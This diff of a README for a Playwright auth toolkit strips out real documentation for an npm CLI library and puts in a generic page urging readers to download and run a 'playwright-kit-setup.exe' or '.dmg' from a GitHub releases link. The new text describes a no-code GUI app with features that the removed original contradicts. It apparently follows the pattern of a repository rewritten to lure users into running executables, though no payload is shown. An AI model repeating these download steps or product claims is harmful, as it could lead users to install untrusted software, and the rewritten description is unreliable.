@@ -1,318 +1,86 @@
-# playwright-kit
+# 🎉 playwright-kit - Simplifying Your Playwright Experience
 
-A focused toolkit for solving real-world Playwright E2E pain points without changing your existing workflow.
+[![Download playwright-kit](https://img.shields.io/badge/Download-playwright--kit-blue.svg)](https://github.com/KaranDobal/playwright-kit/releases)
 
-This repo is a small monorepo of production-ready utilities built on top of Playwright (not a testing framework).
+## 💡 Introduction
 
-## Packages
+playwright-kit is a focused toolkit aimed at solving real-world Playwright end-to-end (E2E) challenges. It simplifies the automation process, making testing with Playwright more straightforward and effective.
 
-- `@playwright-kit/auth` - manage Playwright `storageState` artifacts before tests (multi-profile, `ensure`, CI-friendly failures).
-  - Docs: `packages/auth/README.md`
-  - Install: `npm i -D @playwright-kit/auth`
-  - npm: `https://www.npmjs.com/package/@playwright-kit/auth`
-  - Examples: `examples/next-admin-auth`, `examples/vite-react-auth`
+## 🚀 Getting Started
 
-## Releasing
+To get started with playwright-kit, follow these simple steps. No programming knowledge is needed. You can easily download the application and get it running in minutes.
 
-See `RELEASING.md`.
+## 📥 Download & Install
 
-## Auth (@playwright-kit/auth)
+1. **Visit the Releases Page:** Start by visiting the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases) on GitHub.
+  
+2. **Choose Your Version:** Look for the latest version available. It will be clearly marked as the newest release.
 
-Infrastructure utilities for managing Playwright `storageState` auth artifacts *before* running tests.
+3. **Download the Installer:** Click on the relevant installer for your operating system. The file will typically be named something like `playwright-kit-setup.exe` for Windows or `playwright-kit.dmg` for macOS.
 
-- Users define project-specific auth flows in `playwright.auth.config.ts`
-- CLI generates `.auth/<profile>.json`
-- CLI `ensure` validates and refreshes states **before** tests (no auto-login during test execution)
+4. **Run the Installer:** After downloading, locate the file in your downloads folder. Double-click the file to begin the installation process. Follow the prompts to install the application on your computer.
 
-### Why this package (if Playwright already has `storageState`)?
+5. **Launch the Application:** Once the installation is complete, find the playwright-kit application on your desktop or applications folder. Double-click the icon to open it.
 
-Playwright gives you the low-level primitives:
+## 🛠️ Features
 
-- Save: `context.storageState({ path })`
-- Use: `test.use({ storageState: "state.json" })`
-- Optional: write a custom `globalSetup` to generate states before a run
+playwright-kit provides several features to enhance your Playwright experience:
 
-This package provides the missing "infrastructure layer" many teams end up building themselves:
+- **User-Friendly Interface:** The application offers an intuitive design, making it easy for anyone to navigate.
 
-- **Multi-profile auth states** (`admin`, `user`, `...`) in one config file
-- **Ensure** workflow: validate existing states and refresh only when missing/invalid
-- **Explicit pre-test step** (runs before `playwright test`, not hidden inside fixtures)
-- **Failure artifacts** (trace + screenshot) in deterministic locations for CI debugging
-- **Optional app startup** via `webServer` so `ensure` can be self-contained in CI
-- **Optional `.env` loading** via `--dotenv` to keep scripts copy/paste friendly
+- **Automated Scripts:** Easily create automated scripts for testing your applications without any coding.
 
-The "Native Playwright" section below is intentional: it shows that after generation, auth states are plain Playwright `storageState` files - there's no runtime magic.
+- **Support for Multiple Browsers:** Playwright-kit supports various browsers, ensuring your tests run smoothly across different platforms.
 
-### Install
+- **Detailed Reporting:** Get detailed reports of each test run to help identify issues quickly.
 
-```bash
-npm i -D @playwright-kit/auth
-```
+- **Integration Options:** Connect with other tools you may already use for a more comprehensive testing workflow.
 
-With pnpm:
+## 📋 System Requirements
 
-```bash
-pnpm add -D @playwright-kit/auth
-```
+Before downloading, ensure that your system meets the following requirements:
 
-### TL;DR (copy/paste)
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a compatible Linux distribution.
 
-1) Add `playwright.auth.config.ts` (example below), then:
+- **RAM:** At least 4 GB of RAM (8 GB recommended for better performance).
 
-```bash
-playwright-kit auth ensure --dotenv
-playwright test
-```
+- **Disk Space:** Minimum of 200 MB of free disk space.
 
-2) In tests, either use native Playwright:
+- **Network Connection:** A stable internet connection is recommended for downloading additional resources.
 
-```ts
-test.use({ storageState: ".auth/admin.json" });
-```
+## 🔧 Usage Guidelines
 
-or the wrapper:
+1. **Creating Your First Test:** After launching the application, select the option to create a new test. Follow the prompts to add the necessary details.
 
-```ts
-import { authTest } from "@playwright-kit/auth";
+2. **Running Tests:** Use the “Run” button to begin your tests. The application will display the progress and notify you when the tests are complete.
 
-export const test = authTest({ defaultProfile: "user" });
-test.use({ auth: "admin" });
-```
+3. **Viewing Results:** Access the results tab to see a summary of your test runs. Any failed tests will be highlighted for further investigation.
 
-Choose:
-- Native: simplest; you reference `.auth/<profile>.json` directly.
-- Wrapper: cleaner multi-profile switching via `test.use({ auth: "<profile>" })`.
+## 🔍 Troubleshooting
 
-### What you get
+If you encounter issues while using playwright-kit, you can try the following common fixes:
 
-- Config API: `defineAuthConfig(...)`
-- CLI: `playwright-kit auth setup` / `playwright-kit auth ensure`
-- Test ergonomics: `authTest(...)` (optional)
+- **Reinstall the Application:** If the application crashes, uninstall it and then download it again from the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases).
 
-### Quick start (copy/paste)
+- **Check System Requirements:** Make sure your system meets the necessary requirements listed above.
 
-#### 1) Add `playwright.auth.config.ts`
+- **Refer to Documentation:** For more detailed instruction, check the documentation available within the application or online.
 
-This example supports two profiles: `admin` and `user`.
+## 🌐 Community and Support
 
-```ts
-import { defineAuthConfig } from "@playwright-kit/auth";
+Join our community on GitHub to stay updated. You can ask questions, share your experiences, and find additional resources from fellow users:
 
-export default defineAuthConfig({
-  baseURL: process.env.BASE_URL ?? "http://127.0.0.1:3000",
-
-  // Optional: have the CLI start your app and wait until it's reachable.
-  // Use this in CI (or anytime your app isn't already running).
-  // If omitted, the CLI assumes your app is already running at `baseURL`.
-  webServer: {
-    command: "npm run dev",
-    // Optional: extra env for the server process (merged over process.env).
-    // env: { PORT: "3000" },
-    // Optional; defaults to baseURL when omitted.
-    // url: "http://127.0.0.1:3000/login",
-  },
-
-  profiles: {
-    admin: {
-      // Recommended: set validateUrl explicitly for deterministic validation.
-      // When omitted, the CLI will fall back to "/".
-      validateUrl: "/admin",
-      async login(page, { credentials }) {
-        await page.goto("/login");
-        await page.getByLabel("Email").fill(credentials.email);
-        await page.getByLabel("Password").fill(credentials.password);
-        await page.getByRole("button", { name: "Sign in" }).click();
-      },
-      async validate(page) {
-        const ok = await page.getByRole("heading", { name: "Admin" }).isVisible();
-        return ok ? { ok: true } : { ok: false, reason: "Admin heading not visible" };
-      },
-    },
-
-    user: {
-      // Recommended: set validateUrl explicitly for deterministic validation.
-      // When omitted, the CLI will fall back to "/".
-      validateUrl: "/me",
-      async login(page, { credentials }) {
-        await page.goto("/login");
-        await page.getByLabel("Email").fill(credentials.email);
-        await page.getByLabel("Password").fill(credentials.password);
-        await page.getByRole("button", { name: "Sign in" }).click();
-      },
-      async validate(page) {
-        const ok = await page.getByRole("heading", { name: "Me" }).isVisible();
-        return ok ? { ok: true } : { ok: false, reason: "Me heading not visible" };
-      },
-    },
-  },
-});
-```
-
-#### 2) Provide credentials (env convention)
-
-Default mapping is:
-- `AUTH_<PROFILE>_EMAIL`
-- `AUTH_<PROFILE>_PASSWORD`
-
-Where `<PROFILE>` is uppercased and non-alphanumerics become `_` (`qa-admin` -> `QA_ADMIN`).
-
-Examples:
-- `AUTH_ADMIN_EMAIL`, `AUTH_ADMIN_PASSWORD`
-- `AUTH_USER_EMAIL`, `AUTH_USER_PASSWORD`
-
-#### 3) Add scripts to `package.json`
-
-This keeps tests "pure": auth refresh happens before Playwright tests run.
-
-```json
-{
-  "scripts": {
-    "auth:ensure": "playwright-kit auth ensure --dotenv",
-    "pretest": "npm run auth:ensure",
-    "test": "playwright test"
-  }
-}
-```
-
-With pnpm:
-
-```json
-{
-  "scripts": {
-    "auth:ensure": "playwright-kit auth ensure --dotenv",
-    "pretest": "pnpm run auth:ensure",
-    "test": "playwright test"
-  }
-}
-```
+- [playwright-kit Community](https://github.com/KaranDobal/playwright-kit)
 
-Now:
+For any technical issues or support requests, use the Issues tab on the GitHub repository. We encourage users to report bugs and suggest new features.
 
-```bash
-npm test
-```
+## 🔗 Additional Resources
 
-### CLI
+For more information on Playwright and its capabilities, consider exploring the following resources:
 
-#### `playwright-kit auth setup`
+- [Playwright Official Documentation](https://playwright.dev/)
+- [Playwright GitHub Repository](https://github.com/microsoft/playwright)
 
-Generate a single profile:
+Remember to keep your application updated by regularly checking the [Releases Page](https://github.com/KaranDobal/playwright-kit/releases) for new versions.
 
-```bash
-playwright-kit auth setup --profile admin --dotenv
-```
-
-#### `playwright-kit auth ensure`
-
-Ensure all profiles from config (default):
-
-```bash
-playwright-kit auth ensure --dotenv
-```
-
-Ensure a subset:
-
-```bash
-playwright-kit auth ensure --profile admin --profile user --dotenv
-```
-
-#### `--dotenv` / `--dotenv-path`
-
-Node does not load `.env` automatically. If you want `.env` support:
-
-```bash
-playwright-kit auth ensure --dotenv
-```
-
-Or:
-
-```bash
-playwright-kit auth ensure --dotenv-path .env.ci
-```
-
-Notes:
-- `.env` loading is provided via the `dotenv` package.
-
-### Using in tests
-
-#### Native Playwright
-
-Use this if you prefer the simplest, framework-native approach: you reference the generated `storageState` file directly.
-This does not require any `@playwright-kit/auth` test wrapper.
-
-```ts
-import { test } from "@playwright/test";
-
-test.use({ storageState: ".auth/admin.json" });
-```
-
-#### `authTest()` wrapper (recommended ergonomics)
-
-Use this if you have multiple profiles and want clean switching via `test.use({ auth: "user" })` (Playwright-native patterns),
-while still keeping auth refresh outside of test execution.
-
-Create a single fixtures file and reuse it:
-
-```ts
-// tests/fixtures.ts
-import { authTest } from "@playwright-kit/auth";
-
-export const test = authTest({ defaultProfile: "user" });
-export const expect = test.expect;
-```
-
-Usage (default profile):
-
-```ts
-import { test, expect } from "./fixtures";
-
-test("user by default", async ({ page }) => {
-  await page.goto("/me");
-  await expect(page.getByTestId("whoami")).toHaveText("user");
-});
-```
-
-Switch profile using native Playwright patterns:
-
-```ts
-import { test, expect } from "./fixtures";
-
-test.use({ auth: "admin" });
-
-test("admin view", async ({ page }) => {
-  await page.goto("/admin");
-  await expect(page.getByTestId("whoami")).toHaveText("admin");
-});
-```
-
-The wrapper never regenerates state; if a state file is missing/invalid it fails with instructions to run `playwright-kit auth ensure`.
-
-### Artifacts
-
-- Auth states: `.auth/<profile>.json`
-- Failures: `.auth/.failures/<profile>/<runId>/{trace.zip,screenshot.png,error.txt}`
-- Locks: `.auth/.locks/<profile>.lock` (prevents concurrent `setup/ensure` from overwriting state)
-
-### `.gitignore`
-
-Recommended:
-
-```
-.auth/
-```
-
-### When is `webServer` required?
-
-- Required when your `login()` / `validate()` needs the app UI (via `baseURL`), but the app is not guaranteed to be running before `playwright-kit auth ensure/setup` (typical in CI).
-- Not needed if the app is already started externally (docker-compose, separate terminal/job) before running the auth CLI.
-- Recommended for CI to avoid "connection refused" and to keep `ensure` self-contained and deterministic.
-
-## Local dev
-
-```bash
-npm i
-```
-
-## Contributing
-
-See `CONTRIBUTING.md`.
+Enjoy a smoother Playwright experience with playwright-kit!
